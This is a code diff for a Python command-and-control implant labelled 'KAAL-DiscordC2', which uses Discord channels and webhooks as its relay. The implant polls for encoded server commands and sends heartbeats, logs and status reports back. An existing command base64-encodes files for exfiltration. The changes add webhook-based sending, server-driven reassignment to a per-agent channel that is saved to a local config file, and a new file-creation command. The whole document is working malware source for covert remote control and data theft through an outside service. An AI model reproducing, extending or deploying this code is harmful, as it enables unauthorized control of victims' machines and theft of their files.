@@ -161,22 +161,27 @@ class DiscordRelay(RelayBase):
     def __init__(self, config):
         self.token = config.get("token")
         self.channel_id = config.get("channel_id")
+        self.webhook_url = config.get("webhook_url")
         self.last_msg_id = None
         self.ua = "KAAL-DiscordC2/1.0"
         # 60 requests/min = 1 req/sec. Burst 10.
         self.limiter = RateLimiter(max_tokens=10, refill_rate=1.0)
         
-    def _api(self, method, endpoint, data=None):
+    def _api(self, method, endpoint, data=None, use_webhook=False):
         # WAIT for rate limit token before every request
         # For critical ops, we wait. For polling, we might skip, but let's enforce hygiene.
         self.limiter.wait_for_token()
 
-        url = f"https://discord.com/api/v10/{endpoint}"
-        headers = {
-            "Authorization": f"Bot {self.token}",
-            "Content-Type": "application/json",
-            "User-Agent": self.ua
-        }
+        if use_webhook and self.webhook_url:
+            url = self.webhook_url
+            headers = {"Content-Type": "application/json", "User-Agent": self.ua}
+        else:
+            url = f"https://discord.com/api/v10/{endpoint}"
+            headers = {
+                "Authorization": f"Bot {self.token}",
+                "Content-Type": "application/json",
+                "User-Agent": self.ua
+            }
         
         # Exponential Backoff for 429/Errors
         base_delay = 2
@@ -185,7 +190,8 @@ class DiscordRelay(RelayBase):
         for attempt in range(5):
             try:
                 if data:
-                    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method=method)
+                    req_data = json.dumps(data).encode()
+                    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
                 else:
                     req = urllib.request.Request(url, headers=headers, method=method)
                 
@@ -248,7 +254,7 @@ class DiscordRelay(RelayBase):
     def send_heartbeat(self):
         msg = {"type": "heartbeat", "agent_id": AGENT_ID, "timestamp": time.time()}
         encoded = self._encode(msg)
-        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
+        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
         logger.debug(f"[♥] (Discord C2)")
 
     def poll_commands(self):
@@ -268,15 +274,54 @@ class DiscordRelay(RelayBase):
                     if content.startswith("KAAL_SVR:"):
                         try:
                             payload = self._decode(content[9:])
-                            if payload and payload.get("type") == "command":
+                            if not payload: continue
+                            
+                            p_type = payload.get("type")
+                            print(f"[DEBUG] Decoded payload type: {p_type}")
+                            
+                            # --- Adopt Per-Agent Channel Dynamically ---
+                            if p_type == "registered" and "transport_id" in payload:
+                                new_channel = payload.get("transport_id")
+                                new_webhook = payload.get("webhook_url")
+                                print(f"[DEBUG] Server says adopt new channel: {new_channel} | webhook: {new_webhook}")
+                                
+                                updated_config = False
+                                if new_webhook and new_webhook != self.webhook_url:
+                                    logger.info("Adopted dedicated webhook for telemetry!")
+                                    self.webhook_url = new_webhook
+                                    updated_config = True
+
+                                if new_channel and new_channel != self.channel_id:
+                                    logger.info(f"Adopted per-agent channel: {new_channel}")
+                                    self.channel_id = new_channel
+                                    self.last_msg_id = None # Reset pointer for new channel
+                                    updated_config = True
+
+                                if updated_config:
+                                    try:
+                                        with open("agent_config.json", "r+") as f:
+                                            cfg = json.load(f)
+                                            if "relay_config" in cfg and "discord" in cfg["relay_config"]:
+                                                cfg["relay_config"]["discord"]["channel_id"] = self.channel_id
+                                                if self.webhook_url:
+                                                    cfg["relay_config"]["discord"]["webhook_url"] = self.webhook_url
+                                                f.seek(0)
+                                                json.dump(cfg, f, indent=4)
+                                                f.truncate()
+                                    except: pass
+                                    # Break to start polling the new channel instead of continuing here
+                                    break 
+                                    
+                            elif p_type == "command":
                                 tid = payload.get("task_id")
                                 cmd = payload.get("command")
                                 cmds.append((tid, cmd))
-                        except Exception: pass
+                        except Exception as e: 
+                            pass
             except Exception: pass
         return cmds
 
-    def _upload_large(self, encoded_payload):
+    def _upload_large(self, encoded_payload, use_webhook=True):
         # Respect rate limit for large uploads too
         self.limiter.wait_for_token()
 
@@ -294,13 +339,21 @@ class DiscordRelay(RelayBase):
         body.append(b'')
         
         payload = b'\r\n'.join(body)
-        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
-        headers = {
-            "Authorization": f"Bot {self.token}",
-            "User-Agent": self.ua,
-            "Content-Type": f"multipart/form-data; boundary={boundary}",
-            "Content-Length": str(len(payload))
-        }
+        if use_webhook and self.webhook_url:
+            url = self.webhook_url
+            headers = {
+                "User-Agent": self.ua,
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "Content-Length": str(len(payload))
+            }
+        else:
+            url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
+            headers = {
+                "Authorization": f"Bot {self.token}",
+                "User-Agent": self.ua,
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "Content-Length": str(len(payload))
+            }
         
         try:
             req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
@@ -343,7 +396,7 @@ class DiscordRelay(RelayBase):
                 if len(encoded) > 1800:
                      self._upload_large(encoded)
                 else:
-                    self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
+                    self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
                     
             logger.info(f"Stream {stream_id} complete.")
             return
@@ -365,24 +418,24 @@ class DiscordRelay(RelayBase):
 
         for attempt in range(3):
             self.limiter.wait_for_token()
-            if self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}):
+            if self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True):
                 return
             time.sleep(2)
 
     def send_ack(self, task_id):
         msg = {"type": "ack", "agent_id": AGENT_ID, "task_id": task_id}
         encoded = self._encode(msg)
-        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
+        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
 
     def send_status(self, task_id, status, message=""):
         msg = {"type": "status", "agent_id": AGENT_ID, "task_id": task_id, "status": status, "message": message}
         encoded = self._encode(msg)
-        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
+        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
 
     def send_log(self, level, message):
         msg = {"type": "log", "agent_id": AGENT_ID, "level": level, "message": message, "timestamp": time.time()}
         encoded = self._encode(msg)
-        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
+        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
 
 # Global instance
 relay_system = None
@@ -656,6 +709,21 @@ def execute_command(cmd_line):
              with open(os.path.join(CURRENT_CWD, args[0]), "rb") as f:
                  b64 = base64.b64encode(f.read()).decode()
              return ret_json("download", {"filename": args[0], "data": b64})
+         except Exception as e:
+             return ret_json("text", {"data": f"Error: {e}"})
+
+    elif cmd == "make_file":
+         if not args: return ret_json("text", {"data": "Usage: make_file <path>"})
+         try:
+             path = args[0]
+             # Support absolute paths; otherwise prefix with CWD
+             if not os.path.isabs(path):
+                 path = os.path.join(CURRENT_CWD, path)
+             # Create parent dirs if needed, then touch the file
+             os.makedirs(os.path.dirname(path) if os.path.dirname(path) else CURRENT_CWD, exist_ok=True)
+             with open(path, "ab"):
+                 pass
+             return ret_json("text", {"data": f"File created: {path}"})
          except Exception as e:
              return ret_json("text", {"data": f"Error: {e}"})
 
